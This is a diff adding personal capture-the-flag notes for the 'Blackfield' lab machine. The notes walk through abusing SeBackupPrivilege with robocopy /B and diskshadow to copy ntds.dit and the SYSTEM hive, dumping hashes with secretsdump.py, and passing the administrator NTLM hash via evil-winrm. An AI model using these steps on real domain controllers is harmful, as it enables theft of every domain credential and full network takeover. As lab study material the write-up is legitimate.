@@ -7,6 +7,7 @@ SMB share containing forensics artefacts, including an lsass process dump.
 WinRM privileges
 Dmp the Active Directory database
 Retrieve the hash of the primary domain administrator. 
+Robocopy + diskshadow - Dump Backup
 #########
 BlackFIled:
 
@@ -162,7 +163,167 @@ SMB/LDAP:
 2-Exploit:
     $ evil-winrm -i 10.10.10.192 -u svc_backup  -H '9658d1d1dcd9250115e2205d9f48400d'
 
-    
+    Windows svc_backup Enum:
+        whoami /priv
+
+            RIVILEGES INFORMATION
+            ----------------------
+            Privilege Name                Description                    State
+            ============================= ============================== =======
+            SeMachineAccountPrivilege     Add workstations to domain     Enabled
+            SeBackupPrivilege             Back up files and directories  Enabled  <---------- Robocopy copy file PRIV ESC ?
+            SeRestorePrivilege            Restore files and directories  Enabled  <----------Both for Robocopy
+            SeShutdownPrivilege           Shut down the system           Enabled  
+            SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+            SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+        we are a member of the Backup Operators group, we are authorized to create system backups
+
+        We will use the 'robocopy /B' that allow to COPY FILE in BACKUP MODE
+            In order to get access to some files usually unaccessible
+            -https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
+
+        
+        Robocopy Priv Esc:
+            1st copy some files:
+                robocopy C:\users\administrator\desktop\ C:\temp /B
+
+                we  found this note:
+                    "Mates,
+
+                    After the domain compromise and computer forensic last week, auditors advised us to:
+                    - change every passwords -- Done.
+                    - change krbtgt password twice -- Done.
+                    - disable auditor's account (audit2020) -- KO.
+                    - use nominative domain admin accounts instead of this one -- KO.
+
+                    We will probably have to backup & restore things later.
+                    - Mike.
+
+                    PS: Because the audit report is sensitive, I have encrypted it on the desktop (root.txt)"
+
+            
+            
+            We will use this to our advantage by creating a backup that includes the NTDS.dit file, 
+            from which we can extract the hashes for later use to escalate our privileges:
+
+                -https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960
+
+                
+            Diskshadow creates copies of a currently used drive, while Robocopy copies files and directories from one location to another.
+
+                We cannot copy the system files directly using regular copy commands because they are always running and in use.
+
+            To create the live copy, we run a script that performs a full backup of the C: drive and exposes it as Windows\Temp
+
+                On kali we create a Disk2.txt with the script
+
+            After putting together the script, we pass it to the Diskshadow utility to create the shadow copy that will create a snapshot of the drive while the files are in use:
+                We got to Windows\Temp:
+                    We'll use "upload" because the 'certutil' cmd is bloked by Defender:
+                        upload disk2txt
+
+            We check if it's OK:
+
+                *Evil-WinRM* PS C:\Windows\Temp> diskshadow /s disk2.txt
+                    Microsoft DiskShadow version 1.0
+                    Copyright (C) 2013 Microsoft Corporation
+                    On computer:  DC01,  2/25/2024 4:37:50 PM
+
+                    -> set context persistent nowriter
+
+                    SET CONTEXT { CLIENTACCESSIBLE | PERSISTENT [ NOWRITERS ] | VOLATILE [ NOWRITERS ] }
+
+                            CLIENTACCESSIBLE        Specify to create shadow copies usable by client versions of Windows.
+                            PERSISTENT              Specify that shadow copy is persist across program exit, reset or reboot.
+                            PERSISTENT NOWRITERS    Specify that shadow copy is persistent and all writers are excluded.
+                            VOLATILE                Specify that shadow copy will be deleted on exit or reset.
+                            VOLATILE NOWRITERS      Specify that shadow copy is volatile and all writers are excluded.
+
+                            Example: SET CONTEXT CLIENTACCESSIBLE
+
+            It indicate an error with a (s) missing a 'nowriters' we need to add 'spaces' in our script to avoid some code parsing bugs
+
+            We re upload the new script and re run - it seems to work:
+
+                *Evil-WinRM* PS C:\Windows\Temp\parity> upload disk2.txt
+                                        
+                    Info: Uploading /home/kali/disk2.txt to C:\Windows\Temp\parity\disk2.txt
+                                                            
+                    Data: 272 bytes of 272 bytes copied
+                                                            
+                    Info: Upload successful!
+
+
+                *Evil-WinRM* PS C:\Windows\Temp\parity> diskshadow /s disk2.txt
+                    Microsoft DiskShadow version 1.0
+                    Copyright (C) 2013 Microsoft Corporation
+                    On computer:  DC01,  2/25/2024 4:45:03 PM
+
+                    -> set context persistent nowriters
+                    -> add volume c: alias parity
+                    -> create
+                    Alias parity for shadow ID {1d71a64d-ff5e-46c0-ab56-f5f7bcf7b6cd} set as environment variable.
+                    Alias VSS_SHADOW_SET for shadow set ID {e67d2705-7cb5-463a-bf1d-9c4e51d04642} set as environment variable.
+
+                    Querying all shadow copies with the shadow copy set ID {e67d2705-7cb5-463a-bf1d-9c4e51d04642}
+
+                            * Shadow copy ID = {1d71a64d-ff5e-46c0-ab56-f5f7bcf7b6cd}               %parity%
+                                    - Shadow copy set: {e67d2705-7cb5-463a-bf1d-9c4e51d04642}       %VSS_SHADOW_SET%
+                                    - Original count of shadow copies = 1
+                                    - Original volume name: \\?\Volume{6cd5140b-0000-0000-0000-602200000000}\ [C:\]
+                                    - Creation time: 2/25/2024 4:45:06 PM
+                                    - Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+                                    - Originating machine: DC01.BLACKFIELD.local
+                                    - Service machine: DC01.BLACKFIELD.local
+                                    - Not exposed
+                                    - Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+                                    - Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+                                    Number of shadow copies listed: 1
+                                    -> expose %parity% z:
+                                    -> %parity% = {1d71a64d-ff5e-46c0-ab56-f5f7bcf7b6cd}
+                                    The shadow copy was successfully exposed as z:\.
+                                    -> exec "cmd.exe" /c copy z:\windows\netds.dit c:\Windows\Temp\parity\ntds.dit
+
+                                    The script file name is not valid. <---------------- WE Notice this error because we don't have the 'Permission' to copy
+
+                                    EXEC <file.cmd>
+                                            Execute a script file on the local machine.
+                                            This command is used to duplicate or restore data as part of
+                                            a backup or restore sequence.
+                *Evil-WinRM* PS C:\Windows\Temp\parity> 
+
+            
+            To bypass the copy permission 'Denied' we will use robocopy /B instead of copy:
+                robocopy z:\windows\ntds\ c:\Windows\Temp\parity\ ntds.dit /B
+
+            IT WORKS !!!!
+                Via evil win rm:
+                    reg.exe save hklm\system c:\Windows\Temp\parity\system.bak
+
+                    download ntds.dit
+                    download system.bak
+
+            We go back to our Kali and check if ntdis and system are well uploaded
+
+            We'll user "secretsdump.py" to dump ntdis + system.bak in LOCAL machine:
+
+                └─$ /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.bak -ntds ntds.dit LOCAL 
+
+            NOW we have the Administrator NTLM hash that we'll use to perform PTH via evil win rm:
+
+                We use the laste part of the NTLM Hash:
+                    evil-winrm -i 10.10.10.192 -u administrator  -H '184fb5e5178480be64824d4cd53b99ee'
+
+            We can also use lsassy.py to get a clear password:
+                -d blackfield -u administrator -H 184fb5e5178480be64824d4cd53b99ee blackfield -m 0
+
+
+
+                
+
+
 
 
  
